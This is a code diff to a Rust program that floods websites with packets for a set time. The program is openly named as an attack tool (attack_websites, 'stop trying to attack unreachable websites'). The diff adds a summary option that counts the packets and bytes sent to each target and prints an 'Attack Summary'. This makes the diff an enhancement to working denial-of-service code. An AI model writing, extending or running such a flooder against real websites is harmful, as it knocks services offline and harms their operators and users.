@@ -4,6 +4,7 @@ extern crate log;
 extern crate pretty_env_logger;
 
 use std::{
+    collections::HashMap,
     fmt::{Debug, Display, Formatter},
     fs::File,
     io::{BufRead, BufReader},
@@ -15,6 +16,7 @@ use std::{
 
 use anyhow::*;
 use dns_lookup::lookup_host;
+use lazy_static::lazy_static;
 use portpicker::pick_unused_port;
 use rand::{thread_rng, RngCore};
 use rayon::prelude::*;
@@ -27,17 +29,20 @@ struct Config {
     packet_size: usize,
     default_ports: Vec<String>,
     unreachable_stop_trying: bool,
+    summary: bool,
 }
 
 impl Display for Config {
     fn fmt(&self, f: &mut Formatter<'_>) -> std::fmt::Result {
         write!(
             f,
-            "Config {{ execution_time: {}s, timeout: {}ms, packet_size: {} bytes, default_ports: [{}] }}",
+            "Config {{ execution_time: {}s, timeout: {}ms, packet_size: {} bytes, default_ports: [{}], unreachable_stop_trying: {}, summary: {} }}",
             self.execution_time,
             self.timeout.as_millis(),
             self.packet_size,
-            self.default_ports.join(", ")
+            self.default_ports.join(", "),
+            self.unreachable_stop_trying,
+            self.summary
         )
     }
 }
@@ -59,6 +64,9 @@ fn load_config() -> Result<Config> {
 
     // Default for stop trying to attack unreachable anymore websites - true
     let mut unreachable_stop_trying = true;
+
+    // Default for showing summary - true
+    let mut summary = true;
 
     for config_line in config_lines.flatten() {
         if config_line.is_empty() {
@@ -98,6 +106,15 @@ fn load_config() -> Result<Config> {
                         }
                     }
                 }
+                "summary" => {
+                    if let Some(sum) = split.next() {
+                        summary = match sum.to_lowercase().as_str() {
+                            "true" => true,
+                            "false" => false,
+                            _ => true,
+                        }
+                    }
+                }
                 _ => {}
             }
         }
@@ -114,6 +131,7 @@ fn load_config() -> Result<Config> {
         packet_size,
         default_ports,
         unreachable_stop_trying,
+        summary,
     };
 
     info!("Loaded config: {}", config);
@@ -263,6 +281,13 @@ fn attack_websites(config: Config, website_configs: Vec<WebsiteConfig>) -> Resul
             while start.elapsed().as_secs() < config.execution_time {
                 match socket.connect(socket_address.clone()) {
                     std::result::Result::Ok(_) => {
+                        if config.summary {
+                            (*SUMMARY)
+                                .lock()
+                                .unwrap()
+                                .insert(socket_address.clone(), PacketSummary::default());
+                        }
+
                         let buffer = generate_buffer(config.packet_size);
 
                         while start.elapsed().as_secs() < config.execution_time {
@@ -274,6 +299,15 @@ fn attack_websites(config: Config, website_configs: Vec<WebsiteConfig>) -> Resul
                                         "Successfully sent a packet of size {} to {}",
                                         size, socket_address
                                     );
+
+                                    if config.summary {
+                                        if let Some(packet_summary) =
+                                            (*SUMMARY).lock().unwrap().get_mut(socket_address)
+                                        {
+                                            packet_summary.size += size as u128;
+                                            packet_summary.amount += 1;
+                                        }
+                                    }
                                 }
                                 std::result::Result::Err(error) => {
                                     error!(
@@ -316,6 +350,31 @@ fn generate_buffer(size: usize) -> Vec<u8> {
     buffer
 }
 // ----- Attack Websites END -----
+
+// ----- Attack Summary START -----
+#[derive(Default)]
+struct PacketSummary {
+    amount: u128,
+    size: u128,
+}
+
+lazy_static! {
+    static ref SUMMARY: Arc<Mutex<HashMap<String, PacketSummary>>> =
+        Arc::new(Mutex::new(HashMap::new()));
+}
+
+fn show_summary() {
+    info!("~~~~~~~ Attack Summary START ~~~~~~~");
+    for (socket_address, packet_summary) in (*SUMMARY).lock().unwrap().iter() {
+        info!(
+            "Socket Address: {}, Packets Sent: {}, Sum Packet Size: {} bytes",
+            socket_address, packet_summary.amount, packet_summary.size
+        );
+    }
+    info!("~~~~~~~ Attack Summary END ~~~~~~~");
+}
+// ----- Attack Summary END -----
+
 fn main() -> Result<()> {
     std::env::set_var("RUST_LOG", "info");
 
@@ -324,7 +383,11 @@ fn main() -> Result<()> {
     let config = load_config()?;
     let website_configs = load_websites_configs(&config)?;
 
-    attack_websites(config, website_configs)?;
+    attack_websites(config.clone(), website_configs)?;
+
+    if config.summary {
+        show_summary();
+    }
 
     Ok(())
 }
